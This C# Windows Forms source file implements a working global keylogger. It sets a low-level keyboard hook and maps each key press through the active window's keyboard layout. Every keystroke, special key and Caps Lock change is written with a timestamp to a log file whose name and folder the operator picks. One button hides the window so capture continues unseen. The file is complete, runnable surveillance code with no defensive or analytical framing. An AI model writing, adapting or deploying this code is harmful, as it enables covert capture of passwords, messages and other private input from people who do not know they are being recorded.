using System;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace klava
{
    public partial class Form1 : Form
    {
        public static string name = "null";
        public static string pathtmp = Application.StartupPath;
        public static string loggerPath = Application.StartupPath + @"\log-" + name + ".txt";
        public Form1()
        {
            InitializeComponent();
            label1.Text = Application.StartupPath + @"\log-" + name + ".txt";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            _hookID = SetHook(_proc);
            button1.Enabled = false;
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper() + " " + DateTime.Now + Environment.NewLine;
                }
                else
                {
                    currentKey = currentKey.ToLower() + " " + DateTime.Now + Environment.NewLine;
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]" + " " + DateTime.Now + Environment.NewLine;

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = "[SPACE]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "Return":
                            currentKey = "[ENTER]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "Escape":
                            currentKey = "[ESC]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "Back":
                            currentKey = "[Back]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "LWin":
                            currentKey = "[WIN]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "Tab":
                            currentKey = "[Tab]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "[CAPSLOCK: OFF]" + " " + DateTime.Now + Environment.NewLine;
                            else
                                currentKey = "[CAPSLOCK: ON]" + " " + DateTime.Now + Environment.NewLine;
                            break;
                    }
                }

                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    sw.Write(currentKey);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion

        private void button2_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
                loggerPath = folderBrowserDialog.SelectedPath + @"\log-" + name + ".txt";
                label1.Text = folderBrowserDialog.SelectedPath + @"\log-" + name + ".txt";
                pathtmp = folderBrowserDialog.SelectedPath;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            name = textBox1.Text;
            label1.Text = pathtmp + @"\log-" + name + ".txt";
            button1.Enabled = true;
            button2.Enabled = true;
            button5.Enabled = true;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.Hide();
        }
    }
}
